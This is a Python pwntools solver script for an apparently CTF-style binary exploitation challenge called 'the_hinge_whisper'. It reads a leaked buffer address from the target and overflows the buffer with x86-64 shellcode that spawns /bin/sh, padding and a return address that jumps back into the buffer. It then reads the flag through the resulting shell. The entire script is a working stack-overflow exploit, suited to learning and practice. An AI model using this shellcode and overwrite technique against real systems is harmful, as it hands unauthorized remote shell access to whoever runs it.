#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

fname = '../challenge/the_hinge_whisper'

LOCAL = False

os.system('clear')

if LOCAL:
    print('Running solver locally..\n')
    r = process(fname)
else:
    IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
    PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
    r = remote(IP, PORT)
    print(f'Running solver remotely at {IP} {PORT}\n')

r.recvuntil(b'at: ')
keyway_addr = int(r.recvline().strip(), 16)
print(f'[+] Keyway address: {keyway_addr:#04x}')

shellcode = asm('''
    xor  rsi, rsi
    push rsi
    mov  rdi, 0x68732f2f6e69622f
    push rdi
    mov  rdi, rsp
    xor  rdx, rdx
    xor  rax, rax
    mov  al, 0x3b
    syscall
''')

print(f'[+] Shellcode length: {len(shellcode)} bytes')

payload  = shellcode
payload += b'\x90' * (64 - len(shellcode))
payload += p64(0xdeadbeef)
payload += p64(keyway_addr)

r.sendafter(b'key: ', payload)

sleep(0.3)

r.sendline(b'cat flag.txt')
r.sendline(b'echo HINGE_OPENED')
r.sendline(b'exit')

output = r.recvall(timeout=1.0).decode(errors='ignore')
if 'HINGE_OPENED' in output:
    print('\n[+] The hatch yields. Flag retrieved:\n')
    lines = output.split('\n')
    for line in lines:
        if 'HTB{' in line:
            print(f'    {line}')
            break
else:
    print('[!] Something went wrong — dropping to interactive mode')
    r.interactive()
